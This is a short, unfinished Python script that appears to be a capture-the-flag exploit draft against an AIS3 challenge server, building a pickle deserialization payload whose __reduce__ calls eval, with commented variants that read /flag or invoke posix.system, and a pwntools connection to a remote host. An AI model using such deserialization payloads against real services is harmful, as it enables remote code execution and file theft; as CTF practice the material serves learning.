import sys
import requests
import base64
import pickle
from pwn import *

class Foo(object):
    def __init__(self, first=True):
        self.first = first

    def __bool__(self):
        if self.first:
            self.first = False
            return True
        return False
    
    def __len__(self):
        return 0

    def __reduce__(self):
        print("Hi", )
        import subprocess
        return (eval,
                 ("FLAG",))
        # return (open("/flag").read,
        #         ((100,)))


data = Foo()
print(data)
payload = pickle.dumps(data)
a = pickle.loads(payload)


# paylo
# ad = b"\x80\x04((X\x04\x00\x00\x00codeiflask\nrequest.args.get\niposix\nsystem\n."

# data = base64.b64encode(payload).decode("utf-8")
# print(data)
# print("\n".join(requests.get("https://snake.ais3.org/?data={}".format(data)).text[2:-1].split("\\n")))

p = connect("60.250.197.227",  12001)
p.recvuntil("username : ")
p.recvuntil("password : ")
p.recvuntil("TOKEN : ")


